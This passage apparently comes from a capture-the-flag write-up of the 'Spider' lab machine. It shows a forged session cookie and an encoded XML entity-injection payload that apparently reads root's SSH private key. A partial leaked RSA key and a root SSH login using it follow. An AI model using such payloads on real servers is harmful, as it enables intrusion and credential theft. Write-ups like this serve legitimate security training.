[+] Got cookie: .eJxtjrtugzAYRl-lYu5gSLJEykKwSZza1MYX8AZyJBJ-CC1IuSnvXjp06_jpO0c6zwBuHQTrZ_BWB-tAY048vinRUiPt1JsutEfL7vXOnSpNliodYq_DRBSSmUR-iGhYVISSTEsru5vUwLdHu79nKqayZ8vcGKtCR2piCo32VwtNxjCkCgbDDE0N4XHdXh95704sJJFKV9mxI0lWxJU8w6p8UFJDPLLtJAQySM383Kc5nkSOh6g8c3lAfBDWU4Hw0rY-ZQR-_3mTPtc8dggSoZrW4tVYRiisUlqYfDrUQMfywSUP4yRT5MzArcouTD0Z_vOb2e-s8blPScG3E5c7H5WmyRxAoXvZmIf4FhH88YwBvTjsydz35RfuXCuIHBboU2w2wes9GC6nfhqDNXr9AEzMfps.YKLoCA.TTzUd0uj4a9H1eDGdwMkMSd2ibI
b'{"lxml":{" b":"UENFdExTQkJVRWtnVm1WeWMybHZiaUF4TGpBdU1DQXRMVDRLQ2p3aFJFOURWRmxRUlNCeWIyOTBJRnM4SVVWT1ZFbFVXU0IwWlhOMElGTlpVMVJGVFNBbkwzSnZiM1F2TG5OemFDOXBaRjl5YzJFblBsMCtQQ0V0TFNBdExUNEtQSEp2YjNRK0NpQWdJQ0E4WkdGMFlUNEtJQ0FnSUNBZ0lDQThkWE5sY201aGJXVStKblJsYzNRN1BDOTFjMlZ5Ym1GdFpUNEtJQ0FnSUNBZ0lDQThhWE5mWVdSdGFXNCtNRHd2YVhOZllXUnRhVzQrQ2lBZ0lDQThMMlJoZEdFK0Nqd3ZjbTl2ZEQ0PQ=="},"points":0}'
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAl/dn2XpJQuIw49CVNdAgdeO5WZ47tZDYZ+7tXD8Q5tfqmyxq
gsgQskHffuzjq8v/q4aBfm6lQSn47G8foq0gQ1DvuZkWFAATvTjliXuE7gLcItPt
iFtbg7RQV/xaTwAmdRfRLb7x63TG6mZDRkvFvGfihWqAnkuJNqoVJclgIXLuwUvk
4d3/Vo/MdEUb02ha7Rw9oHSYKR4pIgv4mDwxGGL+fwo6hFNCZ+YK96wMlJc3vo5Z
EgkdKXy3RnLKvtxjpIlfmAZGu0T+RX1GlmoPDqoDWRbWU+wdbES35vqxH0uM5WUh
vPt5ZDGiKID4Tft57udHxPiSD6YBhLT5ooHfFQIDAQABAoIBAFxB9Acg6Vc0kO/N
krhfyUUo4j7ZBHDfJbI7aFinZPBwRtq75VHOeexud2vMDxAeQfJ1Lyp9q8/a1mdb
...[snip]...

```

It works to get a shell as root:

```

oxdf@parrot$ ssh -i ~/keys/spider-root root@10.10.10.243
Last login: Mon May 17 16:35:28 2021 from 10.10.14.7
root@spider:~# 

```